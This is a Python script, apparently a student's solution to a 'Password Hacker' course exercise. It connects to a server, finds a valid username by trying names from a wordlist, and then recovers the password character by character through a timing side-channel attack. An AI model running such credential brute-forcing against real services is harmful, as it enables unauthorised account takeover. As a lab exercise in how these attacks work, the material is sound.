# write your code here
import json
import socket
import sys
from time import time
ip_address = sys.argv[1]
port = int(sys.argv[2])
address = (ip_address, port)
new_socket = socket.socket()
new_socket.connect(address)

file = "/Users/jerma/PycharmProjects/Password Hacker (Python)/Password Hacker (Python)/task/hacking/logins.txt"

login = {
    "login": "",
    "password": ""
}
with open(file, "r") as file_read:
    for login_name in file_read:
        login["login"] = login_name.strip()
        message_str = json.dumps(login)
        new_socket.send(message_str.encode())
        response = (new_socket.recv(1024)).decode()
        if response == json.dumps({"result": "Wrong password!"}):
            break

character_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                  'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
capitalised_alphabet = [item.capitalize() for item in character_list[0:26]]

for character in capitalised_alphabet:
    character_list.append(character)
word = ''
correct_password = False

while not correct_password:
    for character in character_list:
        password = word + character
        login["password"] = password
        message_str = json.dumps(login)
        message_encoded = message_str.encode()
        new_socket.send(message_encoded)
        start = time()
        response = (new_socket.recv(1024)).decode()
        end = time()
        total_time = end-start
        if response == json.dumps({
            "result": "Connection success!"
        }):
            correct_password = True
            break
        if total_time > 0.1:
            word = password
            break


login_details = json.dumps(login)
print(login_details)
